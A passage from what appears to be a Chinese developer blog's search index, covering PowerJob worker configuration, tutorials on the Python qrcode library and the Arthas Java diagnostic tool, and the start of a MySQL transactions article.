class="line">spring.jpa.properties.hibernate.validator.apply_to_ddl&#x3D;false</span><br><span class="line">spring.jpa.properties.hibernate.validate&#x3D;false</span><br></pre></td></tr></table></figure><p>l 删除配置(必须)</p><p>下面配置涉及钉钉登陆和报警请删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">####### DingTalk properties(Non-core configuration properties) #######</span><br><span class="line">####### Delete the following code to disable the DingTalk #######</span><br><span class="line">oms.alarm.ding.app-key&#x3D;dingauqwkvxxnqskknfv</span><br><span class="line">oms.alarm.ding.app-secret&#x3D;XWrEPdAZMPgJeFtHuL0LH73LRj-74umF2_0BFcoXMfvnX0pCQvt0rpb1JOJU_HLl</span><br><span class="line">oms.alarm.ding.agent-id&#x3D;847044348</span><br></pre></td></tr></table></figure><h4 id="低版本spring-boot-配置类"><a href="#低版本spring-boot-配置类" class="headerlink" title="低版本spring boot 配置类"></a>低版本spring boot 配置类</h4><p>springboot低于2.7.4的版本，的项目无法注册到server调度端，启动报错，需手写配置类。</p><p>相关issue地址: <a href="https://github.com/PowerJob/PowerJob/issues/622" target="_blank" rel="noopener">https://github.com/PowerJob/PowerJob/issues/622</a></p><p><img src="/img/powerJob/powerJob9.png" alt="powerJob"> </p><p>参考配置类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line">import shade.powerjob.com.google.common.collect.Lists;</span><br><span class="line">import tech.powerjob.worker.PowerJobSpringWorker;</span><br><span class="line">import tech.powerjob.worker.common.PowerJobWorkerConfig;</span><br><span class="line">import tech.powerjob.worker.common.constants.StoreStrategy;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @description powerJob work调度端配置类</span><br><span class="line"> *&#x2F;</span><br><span class="line">@Configuration</span><br><span class="line">public class PowerJobWorkerConfiguration &#123;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public PowerJobSpringWorker initPowerJobWorker() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 1. 创建配置文件</span><br><span class="line">        PowerJobWorkerConfig config &#x3D; new PowerJobWorkerConfig();</span><br><span class="line">        config.setPort(28888);</span><br><span class="line">        config.setAppName(&quot;fpa-job&quot;);</span><br><span class="line">        config.setServerAddress(Lists.newArrayList(&quot;127.0.0.1:7700&quot;, &quot;127.0.0.1:7701&quot;));</span><br><span class="line">        &#x2F;&#x2F; 如果没有大型 Map&#x2F;MapReduce 的需求，建议使用内存来加速计算</span><br><span class="line">        config.setStoreStrategy(StoreStrategy.DISK);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 2. 创建 Worker 对象，设置配置文件（注意 Spring 用户需要使用 PowerJobSpringWorker，而不是 PowerJobWorker）</span><br><span class="line">        PowerJobSpringWorker worker &#x3D; new PowerJobSpringWorker(config);</span><br><span class="line">        return worker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h3><p>本调研报告主要基于5.1.0版本编写，该版本于2024/08/11合并发布到master分支，不建议使用5.x之前版本，4.x版本密码明文存储没有全局管理账号概念，每一个应用集群对应一个账号不便管理。更早版本缺少维护。</p><p>Maven版本仓库地址：</p><p><a href="https://mvnrepository.com/artifact/tech.powerjob/powerjob-worker-spring-boot-starter?__cf_chl_tk=0uYoMzESN4GWZVrN6Ap50wmYNutjXulbLydFpUjqzIo-1723526522-0.0.1.1-13033" target="_blank" rel="noopener">https://mvnrepository.com/artifact/tech.powerjob/powerjob-worker-spring-boot-starter?__cf_chl_tk=0uYoMzESN4GWZVrN6Ap50wmYNutjXulbLydFpUjqzIo-1723526522-0.0.1.1-13033</a></p>]]></content>
      
      
      <categories>
          
          <category> powerJob </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powerJob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速生成二维码的python项目</title>
      <link href="/2024/04/02/%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E7%9A%84python%E9%A1%B9%E7%9B%AE/"/>
      <url>/2024/04/02/%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E7%9A%84python%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="用-Python-生成有“灵魂”的二维码"><a href="#用-Python-生成有“灵魂”的二维码" class="headerlink" title="用 Python 生成有“灵魂”的二维码"></a>用 Python 生成有“灵魂”的二维码</h1><p align="center">本文作者：HelloGitHub-<strong>LITTLECHIEH</strong></p><p>转载自 HelloGitHub 推出的<a href="https://github.com/HelloGitHub-Team/Article" target="_blank" rel="noopener">《讲解开源项目》</a>系列，今天给大家推荐一个 Python 开源生成二维码的项目——qrcode</p><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><h3 id="1-1-二维码"><a href="#1-1-二维码" class="headerlink" title="1.1 二维码"></a>1.1 二维码</h3><p>二维码又称二维条码，常见的二维码为 QR Code，QR 全称 Quick Response。是一个近几年来移动设备上超流行的一种编码方式，在现在的生活中二维码随处可见。我们可以用它支付、浏览网站等，为什么他会这么流行？下面说几个特点：</p><ol><li>可存储的信息量大：可容纳多达 1850 个大写字母或 2710 个数字或 1108 个字节或 500 多个汉字。</li><li>容错能力强：具有纠错功能，这使得二维条码因穿孔、污损等引起局部损坏时，照样可以正确得到识读，损毁面积达 30% 仍可恢复信息。</li><li>译码可靠性高：它比普通条码译码错误率百万分之二要低得多，误码率不超过千万分之一。</li><li>激光可识别。</li></ol><p>比如我们现在常见的公众号二维码，他就利用了二维码容错能力强的特点，在二维码中间加入了公众号的图标。虽然中间的图片遮盖了一部分二维码的真实数据，但因为其强大的容错能力，所以并没有影响二维码要传递的数据。</p><h3 id="1-2-二维码的组成"><a href="#1-2-二维码的组成" class="headerlink" title="1.2 二维码的组成"></a>1.2 二维码的组成</h3><p><img src="/img/qr/1.png" alt="qr"> </p><p>一图胜千言，好了这里二维码的基本知识就介绍完成了。</p><h3 id="1-3-生成二维码库"><a href="#1-3-生成二维码库" class="headerlink" title="1.3 生成二维码库"></a>1.3 生成二维码库</h3><p>二维码是一个很方便的传递信息的载体，但是像上面黑白的二维码感觉非常缺少‘灵魂’。下面就介绍今天的主角：qrcode</p><p>这是一个由 Python 编写的二维码生成器，支持生成 GIF 动态、图片二维码，让你的二维码变得有趣起来。</p><blockquote><p>项目地址：<a href="https://github.com/sylnsfar/qrcode" target="_blank" rel="noopener">https://github.com/sylnsfar/qrcode</a></p></blockquote><h2 id="二、qrcode-库的优点"><a href="#二、qrcode-库的优点" class="headerlink" title="二、qrcode 库的优点"></a>二、qrcode 库的优点</h2><p>为什么需要使用到这个二维码生成器来生成二维码呢？</p><ol><li><p>使用简单：快速上手，仅需 2 行代码，即可开始使用！</p></li><li><p>在二维码中增加图片：可以让用户通过二维码中的图片，初步了解该二维码是和什么东西有关。（该二维码加入了 HG 的 logo）</p><p><img src="/img/qr/2.png" alt="qr"> </p></li><li><p>在二维码中增加动图：通过动图，让二维码活过来。</p><p><img src="/img/qr/3.gif" alt="qr"> </p></li><li><p>使用方式多样：有以下的 3 种使用方式</p><ul><li>命令行方式</li><li>导入文件方式（import）</li><li><a href="https://github.com/sylnsfar/qrcode_win" target="_blank" rel="noopener">可执行文件</a></li></ul></li><li><p>用就对了：我不要你觉得，我要我觉得 <del>滑稽</del></p></li></ol><h2 id="三、快速上手"><a href="#三、快速上手" class="headerlink" title="三、快速上手"></a>三、快速上手</h2><blockquote><p>演示环境</p><p>操作系统：Windows | Python 版本：3.5</p></blockquote><h3 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1 安装"></a>3.1 安装</h3><p>我们通过 Python 的 pip 包管理工具进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install myqr</span><br></pre></td></tr></table></figure><blockquote><p>注：此处可能需要升级 pip，升级命令 <code>pip install --upgrade pip</code></p></blockquote><p>安装完成之后，就可以直接在命令行中使用了！下面逐一讲解各种二维码的生成方法</p><h3 id="3-2-普通二维码"><a href="#3-2-普通二维码" class="headerlink" title="3.2 普通二维码"></a>3.2 普通二维码</h3><p>首先生成一个普通二维码</p><ol><li><p>打开 cmd</p></li><li><p>输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myqr https://github.com -n helloword.png</span><br></pre></td></tr></table></figure><p>参数 <code>-n</code>：生成二维码的文件名</p></li></ol><p>这样就会得到一个二维码图片，生成的图片保存在了当前目录，后面可以通过传入参数修改默认目录。</p><h3 id="3-3-彩色二维码"><a href="#3-3-彩色二维码" class="headerlink" title="3.3 彩色二维码"></a>3.3 彩色二维码</h3><ol><li><p>先准备一张图片放在目录下（<strong>方形</strong>的图片效果最好）</p><p><img src="/img/qr/4.png" alt="qr"> </p></li><li><p>将图片名称修改为 github.jpg（后缀根据自己的照片格式而定）</p></li><li><p>在命令行中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myqr https://github.com -n mypicture.png -p github.jpg -c</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><code>-n</code>：生成二维码的名称</li><li><code>-p</code>：二维码加入的图片，支持 jpg、gif、png 格式</li><li><code>-c</code>：选择是否生成彩色二维码，如果不设置默认为黑白</li><li>更多参数请看下面附录部分</li></ul></li></ol><h3 id="3-4-动态二维码"><a href="#3-4-动态二维码" class="headerlink" title="3.4 动态二维码"></a>3.4 动态二维码</h3><p>步骤和彩色二维码的方法一致，但是需要注意：</p><ol><li>增加图片为 gif</li><li>修改生成二维码的后缀为 gif</li></ol><h2 id="四、附录"><a href="#四、附录" class="headerlink" title="四、附录"></a>四、附录</h2><h3 id="4-1-MyQR-参数"><a href="#4-1-MyQR-参数" class="headerlink" title="4.1 MyQR 参数"></a>4.1 MyQR 参数</h3><p>从官方文档整理的常用参数如下：</p><ul><li><code>-n</code>：生成二维码的名称</li><li><code>-p</code>：二维码加入的图片，支持<code>.jpg</code>、<code>.gif</code>、<code>.png</code>、<code>.bmp</code> 格式</li><li><code>-c</code>：选择是否生成彩色二维码，如果不设置默认为黑白</li><li><code>-v</code>：控制边长，范围是 1 至 40，数字越大边长越大</li><li><code>-l</code>：控制纠错水平，范围是 L、M、Q、H 从左到右依次升高</li><li><code>-d</code>：控制输出二维码的存储位置</li><li><code>-con</code>：用以调节图片的对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为 1.0</li><li><code>-bri</code>：用来调节图片的亮度，其余用法和取值与 <code>-con</code> 相同</li></ul><h3 id="4-2-cmd-切换盘符"><a href="#4-2-cmd-切换盘符" class="headerlink" title="4.2 cmd 切换盘符"></a>4.2 cmd 切换盘符</h3><p>打开命令行有个小技巧，可以将 cmd 迅速切换到想要的目录，避免了切换盘符的麻烦：</p><ol><li><p>利用文件管理，找到目标文件夹</p></li><li><p>顶部地址栏输入 cmd，然后‘回车‘</p><p><img src="/img/qr/5.png" alt="qr"> </p></li><li><p>切换盘符的坑：直接切换盘符会失败</p><p><img src="/img/qr/6.png" alt="qr"> </p></li></ol><h3 id="4-3-二维码分类介绍"><a href="#4-3-二维码分类介绍" class="headerlink" title="4.3 二维码分类介绍"></a>4.3 二维码分类介绍</h3><p>二维码有以下几种分类</p><ol><li><p>黑白和彩色码</p><ul><li>黑白码</li><li>彩色码</li></ul></li><li><p>融合和视觉码</p><ul><li><p>融合码：就是将内容与二维码融合使它们成为一个整体，图片由二维码组成，二维码就是图片的一部分。这种比较适合使用构造简单的图片或者文字做美化主体内容</p></li><li><p>视觉码：以图片为背景，再在图片上构建很多特殊的点，这些点不会影响背景的视觉效果</p><p><img src="/img/qr/7.gif" alt="qr"> </p></li></ul></li><li><p>艺术码</p><ul><li>艺术二维码，就是将二维码进行的各个“码眼”按照设计师的构思进行分析、拆解、合并，再在那些“码眼”区域填充上一些小素材元素，最后形成一个别具特色二维码。<br><img src="/img/qr/8.gif" alt="qr"> </li></ul></li></ol><h2 id="五、最后"><a href="#五、最后" class="headerlink" title="五、最后"></a>五、最后</h2><p>以上就是本篇文章的全部内容了，相信你对二维码更加了解了。并且对 qrcode 库的常用参数有了一定了解，那就快去生成一个有趣、有‘灵魂’的二维码吧！</p><p>有好玩的库，但不会用，看着干着急？欢迎告诉我们，同时也欢迎加入我们。我们的愿景：<br>“让对开源感兴趣的人不再畏惧，开源项目的发起者不再孤单。”</p><h2 id="六、参考资料"><a href="#六、参考资料" class="headerlink" title="六、参考资料"></a>六、参考资料</h2><ul><li><a href="https://www.jianshu.com/p/5f8df373be7a" target="_blank" rel="noopener">小技巧｜还在用黑白二维码？弱爆了！教你点新的技能！</a></li><li><a href="https://www.csie.ntu.edu.tw/~kmchao/bcc15spr/20150325_QR_Code.pdf" target="_blank" rel="noopener">PDF 淺談 QR Code</a></li><li><a href="https://github.com/sylnsfar/qrcode/blob/master/README-cn.md" target="_blank" rel="noopener">QRcode</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> qrcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qrcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源的Java诊断工具:Arthas</title>
      <link href="/2024/03/17/%E5%BC%80%E6%BA%90%E7%9A%84Java%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7-Arthas/"/>
      <url>/2024/03/17/%E5%BC%80%E6%BA%90%E7%9A%84Java%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7-Arthas/</url>
      
        <content type="html"><![CDATA[<h1 id="带你上手阿里开源的-Java-诊断利器：Arthas"><a href="#带你上手阿里开源的-Java-诊断利器：Arthas" class="headerlink" title="带你上手阿里开源的 Java 诊断利器：Arthas"></a>带你上手阿里开源的 Java 诊断利器：Arthas</h1><p>转载自HelloGitHub 推出的<a href="https://github.com/HelloGitHub-Team/Article" target="_blank" rel="noopener">《讲解开源项目》</a>系列，今天给大家带来一款阿里开源的 Java 诊断利器 Arthas 项目—— <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">Arthas</a> </p><blockquote><p>项目源码地址：<a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></p></blockquote><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>为什么要用 Arthas？好多 Java 开发的小伙伴可能有遇到下面这些问题：</p><ul><li><p>项目中导入了一个 jar 包的不同版本，那么这个类从哪个 jar 包加载的？线上环境为什么会报各种异常？</p></li><li><p>本地项目运行没问题，线上环境运行的结果为什么和本地不同？数据原因没有执行到？代码没有 commit？环境上使用的分支搞不对？</p></li><li><p>线上环境遇到偶先问题，难道只能通过加日志，调整项目日志级别，重新打包发布验证问题吗？</p></li><li><p>线上环境遇到某个用户的审批流程走的不对，线下环境无法重现，怎么在线上进行远程调试呢？</p></li><li><p>有没有一个监控系统的运行整体状况的功能？</p></li><li><p>JDK 自带了一些监控工具，本地可动态监控 JVM 运行状态，那么线上环境有什么办法可以监控到 JVM 的实时运行状态？</p></li><li><p>在线上环境怎么快速定位应用的热点，生成火焰图？</p></li></ul><h3 id="1-1-实现原理"><a href="#1-1-实现原理" class="headerlink" title="1.1 实现原理"></a>1.1 实现原理</h3><p>整体宏观模块调用图如下：</p><p><img src="/img/arthas/1.png" alt="arthas"> </p><h3 id="1-2-主要功能"><a href="#1-2-主要功能" class="headerlink" title="1.2 主要功能"></a>1.2 主要功能</h3><p>Arthas 提供的功能主要可以分为以下三个方面：</p><ol><li>信息监控<ul><li>进程运行基本信息包括：内存、CPU占用、线程信息、线程堆栈、线程数统计、环境变量信息。</li><li>对象信息：类对象静态属性、 Mbean 的属性信息、已加载类信息、类加载器、类方法信息。</li></ul></li><li>方法调用<ul><li>方法调用入参、返回值查看。</li><li>方法被调用的调用路径、调用耗时、方法调用次数、成功次数、失败次数等统计。</li><li>记录和重做方法调用。</li></ul></li><li>类文件处理<ul><li>dump 已加载类的字节码、字节码反编译、类编译、类重新热加载。</li></ul></li></ol><h2 id="二、安装和使用"><a href="#二、安装和使用" class="headerlink" title="二、安装和使用"></a>二、安装和使用</h2><h3 id="2-1-Linux-环境使用"><a href="#2-1-Linux-环境使用" class="headerlink" title="2.1 Linux 环境使用"></a>2.1 Linux 环境使用</h3><p>登录 <code>Linux</code> 环境，下载 <code>arthas-boot.jar</code>，然后使用命令 <code>java -jar xxx.jar</code> 直接运行 <code>jar</code> 包。</p><p>下面两个命令效果一样，都可以下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://alibaba.github.io/arthas/arthas-boot.jar</span><br><span class="line">wget https://alibaba.github.io/arthas/arthas-boot.jar</span><br></pre></td></tr></table></figure><p>进入 Arthas 第一步需要选择项目</p><p><img src="/img/arthas/2.png" alt="arthas"> </p><h3 id="2-2-Docker-环境使用"><a href="#2-2-Docker-环境使用" class="headerlink" title="2.2 Docker 环境使用"></a>2.2 Docker 环境使用</h3><p>进入一个之前已经启动的 Docker 容器，这里我进入了 tomcat7 容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a <span class="comment">#查看所有容器</span></span><br><span class="line">docker cp arthas-boot.jar tomcat7:/home <span class="comment">#拷贝 jar 到容器 home 目录</span></span><br><span class="line">docker <span class="built_in">exec</span> -it tomcat7 bash <span class="comment">#进入名称叫 tomcat7 的容器</span></span><br><span class="line"><span class="built_in">cd</span> /home </span><br><span class="line">java -jar arthas-boot.jar <span class="comment">#运行 jar 包</span></span><br></pre></td></tr></table></figure><p>注意：选择的 Docker 容器必须是以 JDK 为基础依赖构建的。</p><p>在命令行输入 <code>dashboard</code> 就可以进入仪表板的所有数据。</p><p><img src="/img/arthas/3.png" alt="arthas"> </p><h3 id="2-3-在开发工具-IntelliJ-IDEA-使用"><a href="#2-3-在开发工具-IntelliJ-IDEA-使用" class="headerlink" title="2.3 在开发工具 IntelliJ IDEA 使用"></a>2.3 在开发工具 IntelliJ IDEA 使用</h3><p>Cloud Toolkit 是一个 IDE 插件，帮助开发者更高效地开发、测试、诊断并部署应用。方便地将本地应用一键部署到任意机器，或 ECS、EDAS、Kubernetes。这里只介绍一下连接远程服务器，使用 Arthas。</p><h4 id="2-3-1-安装插件"><a href="#2-3-1-安装插件" class="headerlink" title="2.3.1 安装插件"></a>2.3.1 安装插件</h4><p>在 <code>File</code>-&gt;<code>Settings</code>-&gt;<code>Plugins</code> 搜索 <code>Alibaba Cloud Toolkit</code></p><p><img src="/img/arthas/4.png" alt="arthas"> </p><p>插件安装完重启 IDEA。</p><h4 id="2-3-2-使用工具"><a href="#2-3-2-使用工具" class="headerlink" title="2.3.2 使用工具"></a>2.3.2 使用工具</h4><p>添加远程服务器，如下图操作：</p><p><img src="/img/arthas/5.png" alt="arthas"> </p><p>服务器配置成功后，选择 <code>More</code>-&gt;<code>Diagnostic</code> 即可连接到服务器上。</p><p>  <img src="/img/arthas/6.png" alt="arthas"> </p><h4 id="2-3-3-运行效果"><a href="#2-3-3-运行效果" class="headerlink" title="2.3.3 运行效果"></a>2.3.3 运行效果</h4><p><img src="/img/arthas/7.png" alt="arthas"> </p><h2 id="三、实战案例分析"><a href="#三、实战案例分析" class="headerlink" title="三、实战案例分析"></a>三、实战案例分析</h2><p>以线上代码热更新，这里我写了一个小的 <code>Sprinboot</code> 项目，主要就是一个获取学习信息的接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentConroller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping</span>(<span class="string">"getUserInfo"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Student <span class="title">getUserInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Student(<span class="string">"小刘"</span>,<span class="number">12</span>,<span class="string">"西安市雁塔区"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>curl http://localhost:9000/getUserInfo</code>，访问内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"小刘"</span>,<span class="attr">"id"</span>:<span class="number">12</span>,<span class="attr">"address"</span>:<span class="string">"西安市雁塔区"</span>&#125;</span><br></pre></td></tr></table></figure><p>在服务运行要测试的项目 <code>demo-0.0.1-SNAPSHOT.jar</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup java -jar demo-0.0.1-SNAPSHOT.jar &amp; <span class="comment">#后台运行</span></span><br><span class="line">curl http://localhost:9000/getUserInfo <span class="comment">#访问接口</span></span><br></pre></td></tr></table></figure><p>运行 Arthas 主程序 <code>arthas-boot.jar</code>，选择进入<code>demo-0.0.1-SNAPSHOT.jar</code></p><p><img src="/img/arthas/8.png" alt="arthas"> </p><p>使用 <code>jad</code> 反编译 <code>StudentConroller.java</code> 代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jad --<span class="built_in">source</span>-only com.example.demo.controller.StudentConroller &gt; /tmp/StudentConroller.java</span><br></pre></td></tr></table></figure><p>打开 <code>/tmp/StudentConroller.java</code> 下的文件，修改反编绎出来的代码，修改内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentConroller</span> </span>&#123;</span><br><span class="line">   <span class="meta">@GetMapping</span>(value=&#123;<span class="string">"getUserInfo"</span>&#125;)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Student <span class="title">getUserInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Student(<span class="string">"小刘1"</span>, <span class="number">122</span>, <span class="string">"西安市高新区"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>sc</code> 命令查找加载 <code>StudentConroller</code> 的 ClassLoader</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sc -d *StudentConroller | grep classLoaderHash</span><br><span class="line">classLoaderHash   2e0fa5d3</span><br></pre></td></tr></table></figure></li><li><p><code>mc</code> 命令内存编绎代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mc -c 2e0fa5d3 /tmp/StudentConroller.java -d /tmp</span><br><span class="line">Memory compiler output:/tmp/com/example/demo/arthas/user/controller/StudentConroller.class</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 346 ms</span><br></pre></td></tr></table></figure></li><li><p><code>redefine</code> 命令热更新代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ redefine /tmp/com/example/demo/controller/StudentConroller.class</span><br><span class="line">redefine success, size: 1</span><br></pre></td></tr></table></figure></li><li><p>检测热更新结果<br>再次访问 <code>curl http://localhost:9000/getUserInfo</code>，显示如下内容：<br><img src="/img/arthas/9.png" alt="arthas"> </p></li></ul><p>用 Arthas 的 <code>jad/mc/redefine</code> 一条龙命令来线上热更新代码非常强大，但也很危险，要做好权限管理哦。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本文开头讲 Arthas 有什么作用、我们为什么要用它。接着讲了三种场景是如何使用 Arthas。最后以 Java 代码在线热部署为例，感受了 Arthas 的强大。看到这里我想你也对 Arthas 工具有了一个简单的认识。</p><p>现在的趋势开发人员做了久了慢慢就变为 DevOps，了解更多的底层逻辑也能更好的反馈到代码层面的<strong>上层建筑</strong>。</p><p>本文只能带大家入门，Arthas 还有更多强大的功能等待你的发现！</p><h2 id="五、附录"><a href="#五、附录" class="headerlink" title="五、附录"></a>五、附录</h2><ul><li><a href="https://alibaba.github.io/arthas/quick-start.html" target="_blank" rel="noopener">Arthas 官方文档</a></li><li><a href="https://github.com/alibaba/arthas/issues/1003" target="_blank" rel="noopener">Arthas 脑图—常用命令汇总</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Arthas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arthas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL事务:ACID特性及其实现原理</title>
      <link href="/2024/02/14/MySQL%E4%BA%8B%E5%8A%A1-ACID%E7%89%B9%E6%80%A7%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
      <url>/2024/02/14/MySQL%E4%BA%8B%E5%8A%A1-ACID%E7%89%B9%E6%80%A7%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><p>事务（Transaction）是访问和更新数据库的程序执行单元；事务中可能包含一个或多个sql语句，这些语句要么都执行，要么都不执行。作为一个关系型数据库，MySQL支持事务，本文介绍基于MySQL5.6。</p><p>首先回顾一下MySQL事务的基础知识。</p><h2 id="1-逻辑架构和存储引擎"><a href="#1-逻辑架构和存储引擎" class="headerlink" title="1. 逻辑架构和存储引擎"></a>1. 逻辑架构和存储引擎</h2><p><img src="/img/mysql/mysql0.png" alt="mysql"> </p><p>图片来源：<a href="https://blog.csdn.net/fuzhongmin05/article/details/70904190" target="_blank" rel="noopener">https://blog.csdn.net/fuzhongmin05/article/details/70904190</a></p><p>如上图所示，MySQL服务器逻辑架构从上往下可以分为三层：</p><p>（1）第一层：处理客户端连接、授权认证等。</p><p>（2）第二层：服务器层，负责查询语句的解析、优化、缓存以及内置函数的实现、存储过程等。</p><p>（3）第三层：存储引擎，负责MySQL中数据的存储和提取。<strong>MySQL**</strong>中服务器层不管理事务，事务是由存储引擎实现的。**MySQL支持事务的存储引擎有InnoDB、NDB Cluster等，其中InnoDB的使用最为广泛；其他存储引擎不支持事务，如MyIsam、Memory等。</p><p>如无特殊说明，后文中描述的内容都是基于InnoDB。</p><h2 id="2-提交和回滚"><a href="#2-提交和回滚" class="headerlink" title="2. 提交和回滚"></a>2. 提交和回滚</h2><p>典型的MySQL事务是如下操作的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start &#96;&#96;transaction&#96;&#96;;&#96;&#96;…… #一条或多条sql语句&#96;&#96;commit&#96;&#96;;</span><br></pre></td></tr></table></figure><p>其中start transaction标识事务开始，commit提交事务，将执行结果写入到数据库。如果sql语句执行出现问题，会调用rollback，回滚所有已经执行成功的sql语句。当然，也可以在事务中直接使用rollback语句进行回滚。</p><p><strong>自动提交</strong></p><p>MySQL中默认采用的是自动提交（autocommit）模式，如下所示：</p><p><img src="/img/mysql/mysql1.png" alt="mysql"> </p><p>在自动提交模式下，如果没有start transaction显式地开始一个事务，那么每个sql语句都会被当做一个事务执行提交操作。</p><p>通过如下方式，可以关闭autocommit；需要注意的是，autocommit参数是针对连接的，在一个连接中修改了参数，不会对其他连接产生影响。</p><p><img src="/img/mysql/mysql2.png" alt="mysql"> </p><p>如果关闭了autocommit，则所有的sql语句都在一个事务中，直到执行了commit或rollback，该事务结束，同时开始了另外一个事务。</p><p><strong>特殊操作</strong></p><p>在MySQL中，存在一些特殊的命令，如果在事务中执行了这些命令，会马上强制执行commit提交事务；如DDL语句(create table/drop table/alter/table)、lock 